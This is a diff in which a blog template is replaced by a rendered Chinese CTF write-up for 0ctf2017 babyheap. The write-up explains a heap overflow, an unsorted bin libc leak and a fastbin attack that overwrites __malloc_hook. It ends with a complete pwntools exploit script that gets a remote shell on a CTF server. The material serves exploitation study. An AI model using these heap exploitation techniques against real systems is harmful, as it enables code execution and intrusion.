@@ -1,32 +1,533 @@
-extends includes/layout.pug
 
-block content
-  #post
-    if top_img === false
-      include includes/header/post-info.pug
 
-    article#article-container.post-content!=page.content
-    include includes/post/post-copyright.pug
-    .tag_share
-      if (theme.post_meta.post.tags)
-        .post-meta__tag-list
-          each item, index in page.tags.data
-            a(href=url_for(item.path)).post-meta__tags #[=item.name]
-      include includes/third-party/share/index.pug
-        
-    if theme.reward.enable && theme.reward.QR_code
-      !=partial('includes/post/reward', {}, {cache: true})
 
-    //- ad
-    if theme.ad && theme.ad.post
-      .ads-wrap!=theme.ad.post
 
-    if theme.post_pagination
-      include includes/pagination.pug
-    if theme.related_post && theme.related_post.enable
-      != related_posts(page,site.posts)
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#FFF">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
 
-    if page.comments !== false && theme.comments && theme.comments.use
-      - var commentsJsLoad = true
-      !=partial('includes/third-party/comments/index', {}, {cache: true})
+<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+<link rel="alternate" type="application/rss+xml" title="Hexo" href="http://wscyoulin.github.io/rss.xml" />
+<link rel="alternate" type="application/atom+xml" title="Hexo" href="http://wscyoulin.github.io/atom.xml" />
+<link rel="alternate" type="application/json" title="Hexo" href="http://wscyoulin.github.io/feed.json" />
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="/css/app.css?v=0.2.5">
+
+  
+
+<link rel="canonical" href="http://wscyoulin.github.io/2022/03/31/babyheap/">
+
+
+
+  <title>
+0ctf2017_babyheap（学长的wp微改，学习用） |
+Yume Shoka = Hexo</title>
+<meta name="generator" content="Hexo 6.0.0"></head>
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div id="loading">
+    <div class="cat">
+      <div class="body"></div>
+      <div class="head">
+        <div class="face"></div>
+      </div>
+      <div class="foot">
+        <div class="tummy-end"></div>
+        <div class="bottom"></div>
+        <div class="legs left"></div>
+        <div class="legs right"></div>
+      </div>
+      <div class="paw">
+        <div class="hands left"></div>
+        <div class="hands right"></div>
+      </div>
+    </div>
+  </div>
+  <div id="container">
+    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="inner">
+        <div id="brand">
+          <div class="pjax">
+          
+  <h1 itemprop="name headline">0ctf2017_babyheap（学长的wp微改，学习用）
+  </h1>
+  
+<div class="meta">
+  <span class="item" title="Created: 2022-03-31 00:00:00">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <span class="text">Posted on</span>
+    <time itemprop="dateCreated datePublished" datetime="2022-03-31T00:00:00+08:00">2022-03-31</time>
+  </span>
+</div>
+
+
+          </div>
+        </div>
+        <nav id="nav">
+  <div class="inner">
+    <div class="toggle">
+      <div class="lines" aria-label="Toggle navigation bar">
+        <span class="line"></span>
+        <span class="line"></span>
+        <span class="line"></span>
+      </div>
+    </div>
+    <ul class="menu">
+      <li class="item title"><a href="/" rel="start">Yume Shoka</a></li>
+    </ul>
+    <ul class="right">
+      <li class="item theme">
+        <i class="ic i-sun"></i>
+      </li>
+      <li class="item search">
+        <i class="ic i-search"></i>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+      </div>
+      <div id="imgs" class="pjax">
+        <ul>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gicm07ih54j20zk0m84qp.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gipeuv80yoj20zk0m8kjl.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gipew8gmvyj20zk0m87wh.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gipesng5oej20zk0m87d4.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gicit4jrvuj20zk0m8785.jpg"></li>
+          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gipewr8iypj20zk0m8b29.jpg"></li>
+        </ul>
+      </div>
+    </header>
+    <div id="waves">
+      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+        <defs>
+          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+        </defs>
+        <g class="parallax">
+          <use xlink:href="#gentle-wave" x="48" y="0" />
+          <use xlink:href="#gentle-wave" x="48" y="3" />
+          <use xlink:href="#gentle-wave" x="48" y="5" />
+          <use xlink:href="#gentle-wave" x="48" y="7" />
+        </g>
+      </svg>
+    </div>
+    <main>
+      <div class="inner">
+        <div id="main" class="pjax">
+          
+  <div class="article wrap">
+    
+<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">Home</a></span>
+</div>
+
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="en">
+  <link itemprop="mainEntityOfPage" href="http://wscyoulin.github.io/2022/03/31/babyheap/">
+
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/images/avatar.jpg">
+    <meta itemprop="name" content="John Doe">
+    <meta itemprop="description" content=", ">
+  </span>
+
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="Hexo">
+  </span>
+
+  <div class="body md" itemprop="articleBody">
+    
+
+    <h1 id="0ctf2017-babyheap"><a href="#0ctf2017-babyheap" class="headerlink" title="0ctf2017_babyheap"></a>0ctf2017_babyheap</h1><h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>  64位程序，保护全开</p>
+<p>程序是一个很常见的菜单题</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qDxpTJ"><img data-src="https://s1.ax1x.com/2022/03/28/qDxpTJ.jpg" alt="qDxpTJ.jpg"></a></p>
+<p>输入1申请堆块，输入2编辑堆块内容，3释放堆块，4打印堆块内容</p>
+<p>接下来看一下每个函数的逻辑</p>
+<p>首先是申请堆块</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qDzcxP"><img data-src="https://s1.ax1x.com/2022/03/28/qDzcxP.jpg" alt="qDzcxP.jpg"></a></p>
+<p>程序限制了用户可申请堆块的数量和大小，需要注意的是程序使用的是calloc()函数，calloc()函数会将申请的堆块清空</p>
+<p>接下来看编辑堆块内容</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qrpaAe"><img data-src="https://s1.ax1x.com/2022/03/28/qrpaAe.jpg" alt="qrpaAe.jpg"></a></p>
+<p>这里会让用户自己输入需要填充的size,因为size可控，造成堆溢出</p>
+<p>剩下的释放堆块和打印堆块都是正常的free和show了，而且free之后把指针置零了，基本没啥可以利用的点，这里就不分析了</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>主要思路是利用unsorted bin attack泄露libc的基址，然后利用fast bin attack改写某个地址的内容达到get shell的目的</p>
+<p>进行攻击之前先来学习一下一些前置知识</p>
+<p><code>__malloc_hook</code>钩子函数</p>
+<p>程序在调用<code>malloc()</code>函数时，如果<code>__malloc_hook</code>函数存在的话，程序会先执行钩子函数并返回，源码如下</p>
+<p><code>fast bin</code>的相关安全检查：首块<code>double free</code>检查，当一个<code>chunk</code>被free进<code>fast bin</code>前，会看看链表的第一个chunk是不是该chunk，如果是，说明<code>double free</code>了就报错；分配前size字段校验，从fastbin表中malloc出一个chunk时，拆卸前会检查要分配的这个chunk的size字段是不是真的属于它当前所在的fastbin表，如果size字段的值不是当前fastbin表的合法chunk大小值，则报错，其代码  <code>((((unsigned int)(sz)) &gt;&gt; (bitl == 8 ? 4 : 3)) – 2)</code>；根据size算得应在的表的下标，再和当前所在fastbin的下标对比</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *(*hook) (<span class="keyword">size_t</span>, <span class="keyword">const</span> <span class="keyword">void</span>*)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted bin attack"></a>unsorted bin attack</h3><p>当unsorted bin中只有一个chunk时，chunk的fd和bk指针都指向main_arena+0x58的位置</p>
+<p>我们可以写个例子调试一下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *p = <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="keyword">char</span> *A = <span class="built_in">malloc</span>(<span class="number">0x90</span>);			<span class="comment">//防止被top chunk合并</span></span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qrPGXq"><img data-src="https://s1.ax1x.com/2022/03/28/qrPGXq.jpg" alt="qrPGXq.jpg"></a></p>
+<p>可以看到，当<code>unsorted bin</code>中只有一个chunk时，该chunk的fd和bk指针都指向同一个地址：<code>main_arena+88</code>也就是0x58，而<code>__malloc_hook</code>函数则在<code>main_arena</code>的上方16个字节，也就是<code>main_arena</code>  + 0x10，通过简单的加减法就能得出<code>__malloc_hook</code>的地址为<code>fd - 0x58 - 0x10</code></p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qrV19U"><img data-src="https://s1.ax1x.com/2022/03/28/qrV19U.jpg" alt="qrV19U.jpg"></a></p>
+<p>但是fd和bk只有在chunk free状态下才会生效，由于程序打印堆块内容的函数会检测inuse位，而堆块释放的时候会将inuse位置0</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qrZBaq"><img data-src="https://s1.ax1x.com/2022/03/28/qrZBaq.jpg" alt="qrZBaq.jpg"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qrZ5Ix"><img data-src="https://s1.ax1x.com/2022/03/28/qrZ5Ix.jpg" alt="qrZ5Ix.jpg"></a></p>
+<p>也就是说我们要读一个既在使用状态又在free状态的chunk，显然这样的chunk时不存在的</p>
+<p>换个角度想，如果有一个使用状态的堆块包含一个free状态的堆块，那么我们打印使用状态的堆块就能把里面包含的那个free状态的堆块给打印出来了</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qruy79"><img data-src="https://s1.ax1x.com/2022/03/28/qruy79.png" alt="qruy79.png"></a></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">malloc</span>(chunk0)-&gt;<span class="built_in">malloc</span>(chunk1)-&gt;<span class="built_in">malloc</span>(chunk2)-&gt;<span class="built_in">malloc</span>(chunk3)-&gt;<span class="built_in">free</span>(chunk1)</span><br><span class="line">overwrite chunk1 size = chunk1+chunk2</span><br><span class="line"><span class="built_in">free</span>(chunk2)</span><br><span class="line">show(chunk1)</span><br></pre></td></tr></table></figure>
+
+<p>只需按以上步骤，即可打印出chunk2的fd指针</p>
+<p>为了更好地理解上面的步骤，我们可以gdb调试一下</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qrQFyT"><img data-src="https://s1.ax1x.com/2022/03/28/qrQFyT.jpg" alt="qrQFyT.jpg"></a></p>
+<p>这是free掉chunk1后，可以看到此时chunk1的大小还没被改写，虽然chunk1的fd和bk指针指向了我们想要的地址，但是这样是打印不出来的，接下来我们向chunk0写入数据利用堆溢出覆盖掉chunk1的size为0x90+0x10+0x90+1即0x141</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qrli4A"><img data-src="https://s1.ax1x.com/2022/03/28/qrli4A.jpg" alt="qrli4A.jpg"></a></p>
+<p>chunk1的size被改成了0x141</p>
+<p>接下来只需要把chunk1再calloc回来就能得到一个包含了chun2的chunk1</p>
+<p>但是由于重新分配的chunk1已经被清空了，所以我们需要再次通过堆溢出伪造chunk2的size字段</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qr8nHO"><img data-src="https://s1.ax1x.com/2022/03/28/qr8nHO.jpg" alt="qr8nHO.jpg"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qr8Nb8"><img data-src="https://s1.ax1x.com/2022/03/28/qr8Nb8.jpg" alt="qr8Nb8.jpg"></a></p>
+<p>可以看到经过填充之后chunk2被清空的size字段又被填回了0xa1</p>
+<p>free(chunk2)</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qrGeRs"><img data-src="https://s1.ax1x.com/2022/03/28/qrGeRs.jpg" alt="qrGeRs.jpg"></a></p>
+<p>下面只需要打印chunk1的内容再经过简单计算就能得到__malloc_hook的地址了</p>
+<h3 id="fast-bin-attack"><a href="#fast-bin-attack" class="headerlink" title="fast bin attack"></a>fast bin attack</h3><p>泄露出__malloc_hook的地址之后，计算出距离libc基址的偏移，然后改写<code>__malloc_hook</code>地址即可</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">malloc_hook = fd - <span class="number">0x58</span> - <span class="number">0x10</span></span><br><span class="line">libcbase = malloc_hook - libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br></pre></td></tr></table></figure>
+
+<p>由于<code>fast bin</code>是单链表结构，用fd指针相连，所以我们可以通过修改chunk的fd指针来伪造一个fake chunk到<code>fast bin</code>中，然后连续malloc两次就能得到一个可以任意读写的地址，因为要修改<code>__malloc_hook</code>的内容，所以我们直接到<code>__malloc_hook</code>函数附近找一个符合要求的地址。为了绕过<code>fast bin</code>的size检查，我们必须找到伪造一个size符合<code>fast bin</code>的chunk</p>
+<p>在<code>__malloc_hook</code>-0x23的地方刚好有符合条件的size</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qr0ay4"><img data-src="https://s1.ax1x.com/2022/03/28/qr0ay4.jpg" alt="qr0ay4.jpg"></a></p>
+<p>0x7f是可以绕过<code>fast bin</code>的size检测的，将0x7f带入可以算出伪造的chunk在数组中下标应该为5</p>
+<p>即0x70大小的chunk</p>
+<p>总体攻击思路为申请两个处于<code>fast bin</code>大小内的chunk，一个用于堆溢出，一个用于伪造chunk</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qrDMan"><img data-src="https://s1.ax1x.com/2022/03/28/qrDMan.png" alt="qrDMan.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qrrPL4"><img data-src="https://s1.ax1x.com/2022/03/28/qrrPL4.jpg" alt="qrrPL4.jpg"></a></p>
+<p>可以看到伪造的chunk已经成功链入fast bin中</p>
+<p>接下来只需要把他申请出来然后编辑堆块内容来改写<code>__malloc_hook</code>的内容</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/qrsSAA"><img data-src="https://s1.ax1x.com/2022/03/28/qrsSAA.jpg" alt="qrsSAA.jpg"></a></p>
+<p>成功改写，下面只需要再次申请堆块就可以执行我们改写进__malloc_hook的内容了</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29342</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./babyheap_0ctf_2017&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23-buu-64.so&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allocte</span>(<span class="params">size</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,size,string</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">    io.sendline(string)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">allocte(<span class="number">0x90</span>)				<span class="comment">#chunk0</span></span><br><span class="line">allocte(<span class="number">0x90</span>)				<span class="comment">#chunk1</span></span><br><span class="line">allocte(<span class="number">0x90</span>)				<span class="comment">#chunk2</span></span><br><span class="line">allocte(<span class="number">0x90</span>)				<span class="comment">#chunk3</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x90</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x141</span>)         <span class="comment">#修改chunk1的size包含chunk2</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line">allocte(<span class="number">0x130</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x90</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0xa1</span>)</span><br><span class="line">edit(<span class="number">1</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">io.recv(<span class="number">0x90</span>+<span class="number">0x10</span>)</span><br><span class="line">fd = u64(io.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(fd)</span><br><span class="line"></span><br><span class="line">malloc_hook = fd - <span class="number">0x58</span> - <span class="number">0x10</span></span><br><span class="line">libcbase = malloc_hook - libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">shell = libcbase + <span class="number">0x4526a</span></span><br><span class="line"></span><br><span class="line">allocte(<span class="number">0x90</span>)           <span class="comment">#清空bins chunk2</span></span><br><span class="line">allocte(<span class="number">0x10</span>)           <span class="comment">#用于溢出覆盖fd chun4</span></span><br><span class="line">allocte(<span class="number">0x60</span>)           <span class="comment">#chunk5</span></span><br><span class="line">allocte(<span class="number">0x10</span>)           <span class="comment">#防止top chunk合并</span></span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64(malloc_hook - <span class="number">0x23</span>)    <span class="comment">#p64（malloc_hook-0x23)是因为在malloc_hook减0x23地址上存放了0x7f</span></span><br><span class="line">edit(<span class="number">4</span>, <span class="built_in">len</span>(payload), payload)      <span class="comment">#向chunk5中写入7f  0x7f是可以绕过fast bin的size检测的，将0x7f带入可以算出伪造的chunk在数组中下标应该为5，即0x70大小的chunk</span></span><br><span class="line">allocte(<span class="number">0x60</span>)       <span class="comment">#chunk5</span></span><br><span class="line">allocte(<span class="number">0x60</span>)       <span class="comment">#chunk6</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">3</span> + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(shell)</span><br><span class="line">edit(<span class="number">7</span>, <span class="built_in">len</span>(payload), payload)     <span class="comment">#将shell写入未被申请的内存中，并通过申请这块内存来触发shell</span></span><br><span class="line">allocte(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+
+   <footer>
+
+    <div class="meta">
+  <span class="item">
+    <span class="icon">
+      <i class="ic i-calendar-check"></i>
+    </span>
+    <span class="text">Edited on</span>
+    <time title="Modified: 2022-04-01 20:51:45" itemprop="dateModified" datetime="2022-04-01T20:51:45+08:00">2022-04-01</time>
+  </span>
+</div>
+
       
+<div class="reward">
+  <button><i class="ic i-heartbeat"></i> Donate</button>
+  <p>Give me a cup of [coffee]~(￣▽￣)~*</p>
+  <div id="qr">
+      
+      <div>
+        <img data-src="/images/wechatpay.png" alt="John Doe WeChat Pay">
+        <p>WeChat Pay</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/alipay.png" alt="John Doe Alipay">
+        <p>Alipay</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/paypal.png" alt="John Doe PayPal">
+        <p>PayPal</p>
+      </div>
+  </div>
+</div>
+
+      
+
+<div id="copyright">
+<ul>
+  <li class="author">
+    <strong>Post author:  </strong>John Doe <i class="ic i-at"><em>@</em></i>Hexo
+  </li>
+  <li class="link">
+    <strong>Post link: </strong>
+    <a href="http://wscyoulin.github.io/2022/03/31/babyheap/" title="0ctf2017_babyheap（学长的wp微改，学习用）">http://wscyoulin.github.io/2022/03/31/babyheap/</a>
+  </li>
+  <li class="license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+  </footer>
+
+</article>
+
+  </div>
+  
+
+<div class="post-nav">
+    <div class="item left">
+      
+
+  <a href="/2022/03/18/picoCTF-wp/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva3.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gicitf0kl1j20zk0m87fe.jpg" title="picoCTF_wp">
+  <span class="type">Previous Post</span>
+  <span class="category"><i class="ic i-flag"></i> </span>
+  <h3>picoCTF_wp</h3>
+  </a>
+
+    </div>
+    <div class="item right">
+      
+
+  <a href="/2022/04/02/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%B3%84%E9%9C%B2canary/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva3.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gicit31ffoj20zk0m8naf.jpg" title="格式化字符串泄露canary">
+  <span class="type">Next Post</span>
+  <span class="category"><i class="ic i-flag"></i> </span>
+  <h3>格式化字符串泄露canary</h3>
+  </a>
+
+    </div>
+</div>
+
+  
+  <div class="wrap" id="comments"></div>
+
+
+        </div>
+        <div id="sidebar">
+          
+
+<div class="inner">
+
+  <div class="panels">
+    <div class="inner">
+      <div class="contents panel pjax" data-title="Contents">
+          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0ctf2017-babyheap"><span class="toc-number">1.</span> <span class="toc-text">0ctf2017_babyheap</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90"><span class="toc-number">1.1.</span> <span class="toc-text">程序分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#unsorted-bin-attack"><span class="toc-number">1.2.1.</span> <span class="toc-text">unsorted bin attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fast-bin-attack"><span class="toc-number">1.2.2.</span> <span class="toc-text">fast bin attack</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">1.3.</span> <span class="toc-text">exp</span></a></li></ol></li></ol>
+      </div>
+      <div class="related panel pjax" data-title="Related">
+      </div>
+      <div class="overview panel" data-title="Overview">
+        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="image" itemprop="image" alt="John Doe"
+      data-src="/images/avatar.jpg">
+  <p class="name" itemprop="name">John Doe</p>
+  <div class="description" itemprop="description"></div>
+</div>
+
+<nav class="state">
+    <div class="item posts">
+      <a href="/archives/">
+        <span class="count">21</span>
+        <span class="name">posts</span>
+      </a>
+    </div>
+</nav>
+
+<div class="social">
+</div>
+
+<ul class="menu">
+  
+    
+  <li class="item">
+    <a href="/" rel="section"><i class="ic i-home"></i>Home</a>
+  </li>
+
+
+</ul>
+
+      </div>
+    </div>
+  </div>
+
+  <ul id="quick">
+    <li class="prev pjax">
+        <a href="/2022/03/18/picoCTF-wp/" rel="prev" title="Previous Post"><i class="ic i-chevron-left"></i></a>
+    </li>
+    <li class="up"><i class="ic i-arrow-up"></i></li>
+    <li class="down"><i class="ic i-arrow-down"></i></li>
+    <li class="next pjax">
+        <a href="/2022/04/02/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%B3%84%E9%9C%B2canary/" rel="next" title="Next Post"><i class="ic i-chevron-right"></i></a>
+    </li>
+    <li class="percent"></li>
+  </ul>
+</div>
+
+
